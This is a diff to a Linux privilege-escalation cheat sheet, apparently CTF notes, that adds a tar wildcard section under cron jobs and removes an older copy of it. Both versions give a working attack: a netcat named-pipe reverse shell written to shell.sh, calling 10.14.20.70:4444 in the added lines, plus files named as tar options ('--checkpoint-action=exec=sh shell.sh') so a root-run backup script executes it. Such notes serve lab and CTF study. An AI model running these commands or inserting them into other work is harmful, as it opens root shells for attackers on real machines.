@@ -67,6 +67,30 @@ read cron jobs with `/etc/crontab`
 For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature
 
 Be sure the file has `chmod +x`
+
+### tar
+
+```console
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+
+Exploit:
+```console
+$ echo "mkfifo /tmp/ahikccu; nc 10.14.20.70 4444 0</tmp/ahikccu | /bin/sh >/tmp/ahikccu 2>&1; rm /tmp/ahikccu" > shell.sh
+$ chmod 777 shell.sh
+$ echo "" > "--checkpoint-action=exec=sh shell.sh"
+$ echo "" > --checkpoint=1
+```
+
+start nc listener
+
+```console
+$ sudo /opt/backups/backup.sh
+```
+
 ## Environment var
 
 Show PATH var
@@ -213,17 +237,3 @@ drwxrwxrwt 1 root root   834 20. Feb 12:35 ..
 -rw-r--r-- 1 root root    99 20. Feb 12:33 root.c
 ```
 
-## tar wildcard
-
-```console
-$ echo "mkfifo /tmp/ahikccu; nc VPN IP 1337 0</tmp/ahikccu | /bin/sh >/tmp/ahikccu 2>&1; rm /tmp/ahikccu" > shell.sh
-$ chmod 777 shell.sh
-$ echo "" > "--checkpoint-action=exec=sh shell.sh"
-$ echo "" > --checkpoint=1
-```
-
-start nc listener
-
-```console
-$ sudo /opt/backups/backup.sh
-```
